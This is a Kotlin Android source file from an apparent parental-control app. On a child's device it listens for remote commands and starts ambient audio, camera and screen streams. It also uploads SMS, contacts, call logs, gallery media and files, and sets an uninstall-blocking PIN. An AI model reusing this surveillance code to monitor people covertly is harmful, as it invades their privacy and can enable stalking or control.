package com.example.authapp.service

import android.content.Context
import android.content.Intent
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.CallLogSyncManager
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.GeofenceZone
import com.example.authapp.data.UserLocation
import com.example.authapp.scheduler.RecordingScheduler
import com.example.authapp.security.SimChangeDetector
import com.example.authapp.ui.activity.ScreenCapturePromptActivity
import com.example.authapp.utils.*
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class ChildStreamRequestListener(
    private val context: Context,
    private val streamCoordinator: ChildStreamCoordinator,
    private val snapshotHandler: ChildSnapshotHandler,
    private val overlayManager: ChildOverlayWindowManager,
    private val notificationHelper: ChildServiceNotificationHelper,
    private val deviceStateMonitor: ChildDeviceStateMonitor
) {
    private var streamRequestListener: ValueEventListener? = null
    private var streamRecordingListener: ValueEventListener? = null
    private var recordingScheduleListener: ValueEventListener? = null
    private var parentControlsListener: ValueEventListener? = null
    private var remoteCommandsListener: ValueEventListener? = null
    private var geofencesListener: ValueEventListener? = null
    var activeGeofences = listOf<GeofenceZone>()
        private set

    fun startMonitoring(
        uid: String,
        serviceScope: CoroutineScope,
        onStartWebRtc: (sessionId: String, streamType: String) -> Unit,
        onStopStream: () -> Unit
    ) {
        FirebaseRepository.setupPresenceSystem(uid)

        if (streamRecordingListener == null) {
            streamRecordingListener = FirebaseRepository.listenToRemoteRecording(uid) { isRecording, recType ->
                streamCoordinator.handleRemoteRecording(uid, isRecording, recType)
            }
        }

        SimChangeDetector.checkSimChange(context.applicationContext, uid)
        try { CallLogSyncManager.syncIfDue(context.applicationContext, uid) } catch (_: Exception) {}

        snapshotHandler.listenToSnapshotRequests(
            uid = uid,
            isLiveStreamActive = { streamCoordinator.webRtcManager != null },
            onStartCapture = {
                overlayManager.ensureOverlayWindow()
                notificationHelper.updateForegroundNotification("Capturing Remote Photo", notificationHelper.getSnapshotServiceType())
            },
            onFinishCapture = {
                notificationHelper.updateForegroundNotification("Background Protection Active", notificationHelper.getIdleServiceType())
            }
        )

        if (recordingScheduleListener == null) {
            var previousScheduleIds = emptySet<String>()
            recordingScheduleListener = FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
                val currentIds = schedules.map { it.id }.toSet()
                val deletedIds = previousScheduleIds - currentIds
                for (deletedId in deletedIds) {
                    RecordingScheduler.cancelSchedule(context.applicationContext, deletedId)
                }
                previousScheduleIds = currentIds
                for (schedule in schedules) {
                    RecordingScheduler.setSchedule(context.applicationContext, schedule)
                }
            }
        }

        if (parentControlsListener == null) {
            parentControlsListener = FirebaseRepository.listenToParentControls(uid) { settings ->
                overlayManager.updateStudyModeOverlay(settings.isStudyModeActive, settings.studyModeMessage)
                val activeBlocked = settings.blockedPackages.filterValues { it }.keys
                ChildAccessibilityService.blockedPackageNames = activeBlocked.toSet()
                if (settings.uninstallPin.length == 6) {
                    UninstallProtectionManager.setUninstallPin(context.applicationContext, settings.uninstallPin)
                }
            }
        }

        if (geofencesListener == null) {
            geofencesListener = FirebaseRepository.listenToGeofences(uid) { zones ->
                activeGeofences = zones
            }
        }

        if (remoteCommandsListener == null) {
            try {
                FirebaseDatabase.getInstance().reference.child("commands").child(uid).child("CLOSE_APP").removeValue()
                FirebaseDatabase.getInstance().reference.child("commands").child(uid).child("STOP_APP").removeValue()
            } catch (_: Exception) {}
            remoteCommandsListener = FirebaseRepository.listenToRemoteCommands(uid) { command, value ->
                ChildRemoteCommandHandler.executeRemoteControlCommand(
                    context = context,
                    coroutineScope = serviceScope,
                    uid = uid,
                    command = command,
                    value = value,
                    onSyncInstalledApps = { deviceStateMonitor.syncInstalledApps(it) }
                )
            }
        }

        serviceScope.launch(Dispatchers.IO) {
            try {
                val prefs = context.applicationContext.getSharedPreferences("sms_sync_prefs", Context.MODE_PRIVATE)
                val lastSynced = prefs.getLong("last_sms_timestamp_$uid", 0L)
                val isFirstSync = lastSynced == 0L
                val smsList = SmsUtils.getRecentSms(context.applicationContext, limit = if (isFirstSync) 25 else 30, sinceTimestamp = lastSynced)
                if (smsList.isNotEmpty()) {
                    FirebaseRepository.syncSmsLogs(uid, smsList)
                    val newestTimestamp = smsList.maxOfOrNull { it.timestamp } ?: System.currentTimeMillis()
                    prefs.edit().putLong("last_sms_timestamp_$uid", newestTimestamp).apply()
                }
            } catch (_: Exception) {}
            try { ContactsMonitor.checkNewContacts(context.applicationContext, uid) } catch (_: Exception) {}
            try {
                MediaGalleryUtils.scanAndSyncMediaGallery(context.applicationContext, uid)
                FileManagerUtils.scanAndSyncFileExplorer(context.applicationContext, uid)
            } catch (_: Exception) {}
            try { FirebaseRepository.pruneOldLogs(uid, retentionDays = 7) } catch (_: Exception) {}
            deviceStateMonitor.syncAppUsageStats(uid)
            deviceStateMonitor.syncInstalledApps(uid)
        }

        if (streamRequestListener != null) return
        FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
        streamRequestListener = FirebaseRepository.listenToStreamRequests(
            childId = uid,
            onRequested = { streamType, sessionId ->
                if (streamCoordinator.isDuplicateStreamRequest(sessionId)) return@listenToStreamRequests
                if (!streamCoordinator.isStreaming || streamCoordinator.currentSessionId != sessionId) {
                    if (streamType.equals("audio", ignoreCase = true)) {
                        try {
                            val serviceType = notificationHelper.getStreamingServiceType(streamType)
                            notificationHelper.updateForegroundNotification("Active Ambient Audio Stream", serviceType)
                            onStartWebRtc(sessionId, streamType)
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] WebRTC audio launch fallback: ${e.localizedMessage}")
                            streamCoordinator.startAmbientAudioStream(
                                uid = uid,
                                sessionId = sessionId,
                                streamType = streamType,
                                onAcquireWakeLock = { notificationHelper.acquireWakeLock() },
                                onStreamStarted = {},
                                onStreamFailed = { onStopStream() }
                            )
                        }
                    } else if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
                        val promptIntent = Intent(context, ScreenCapturePromptActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            putExtra(ChildForegroundService.EXTRA_SESSION_ID, sessionId)
                        }
                        context.startActivity(promptIntent)
                    } else {
                        val isVideo = streamType.equals("video", ignoreCase = true) || streamType.equals("camera_video", ignoreCase = true)
                        if (isVideo) {
                            overlayManager.ensureOverlayWindow()
                        }
                        try {
                            val serviceType = notificationHelper.getStreamingServiceType(streamType)
                            notificationHelper.updateForegroundNotification("Active Remote Stream ($streamType)", serviceType)
                            onStartWebRtc(sessionId, streamType)
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] startForeground stream error: ${e.localizedMessage}")
                            onStopStream()
                        }
                    }
                }
            },
            onStopped = {
                onStopStream()
                notificationHelper.updateForegroundNotification("Background Protection Active", notificationHelper.getIdleServiceType())
            }
        )
    }

    fun stopMonitoring() {
        streamRequestListener = null
        streamRecordingListener = null
        recordingScheduleListener = null
        parentControlsListener = null
        remoteCommandsListener = null
        geofencesListener = null
    }
}
